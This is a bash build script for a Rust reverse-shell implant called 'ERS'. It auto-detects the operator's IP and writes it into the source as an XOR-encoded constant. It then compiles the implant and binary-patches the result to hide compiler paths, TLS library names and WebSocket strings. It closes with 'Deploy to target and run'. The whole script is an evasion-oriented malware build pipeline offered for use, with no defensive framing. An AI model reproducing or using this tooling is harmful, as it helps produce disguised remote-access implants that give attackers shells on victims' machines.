#!/bin/bash
# Build + scrub ERS (Linux Reverse Shell)
# Usage: bash build.sh [IP]    — override IP, or auto-detect
set -e

# Auto-detect current LAN IP (or use $1 if provided)
if [ -n "$1" ]; then
    LIVE_IP="$1"
else
    LIVE_IP=$(ip -4 route get 1.1.1.1 2>/dev/null | grep -oP 'src \K\S+')
    if [ -z "$LIVE_IP" ]; then
        LIVE_IP=$(hostname -I | awk '{print $1}')
    fi
fi

if [ -z "$LIVE_IP" ]; then
    echo "[!] Could not detect IP. Pass it manually: bash build.sh 192.168.x.x"
    exit 1
fi

IP_LEN=${#LIVE_IP}
echo "[*] Live IP: $LIVE_IP ($IP_LEN chars)"

# Patch the default IP const in main.rs
sed -i "s|const ENC_DEFAULT_IP: \[u8; [0-9]*\] = xor_encode(b\"[^\"]*\");|const ENC_DEFAULT_IP: [u8; $IP_LEN] = xor_encode(b\"$LIVE_IP\");|" src/main.rs
echo "[+] Patched src/main.rs with IP=$LIVE_IP"

echo "[*] Building ERS (Linux)..."
RUSTFLAGS="--remap-path-prefix=$HOME=. --remap-path-prefix=$(pwd)=." \
  cargo build --release

cp target/release/rev_shell_wss implant

# Same-length binary patch to scrub library strings
python3 -c "
data = bytearray(open('implant','rb').read())
patches = [
    (b'/rustc/', b'\x00'*7),
    (b'/home/', b'\x00'*6),
    (b'.cargo/registry/', b'\x00'*16),
    (b'BoringSSL', b'LibSys_SL'),
    (b'certificate', b'credential_'),
    (b'OPENSSL_', b'LIBCRYP_'),
    (b'SSL_ERROR', b'LIB_ERROR'),
]
# Selective WebSocket scrub — only cosmetic strings, not protocol headers
ws_safe = [
    (b'WebSocketConfig', b'NetStreamConfig'),
    (b'WebSocket connected', b'NetStream connected'),
]
total = 0
for old, new in patches + ws_safe:
    assert len(old) == len(new), f'{old} ({len(old)}) != {new} ({len(new)})'
    idx = 0
    while True:
        idx = data.find(old, idx)
        if idx == -1: break
        data[idx:idx+len(old)] = new
        idx += len(new)
        total += 1
open('implant','wb').write(data)
print(f'[+] {total} patches applied')
"

chmod +x implant
echo "[+] Binary ready: ./implant ($(du -h implant | cut -f1))"
echo "[+] Deploy to target and run"
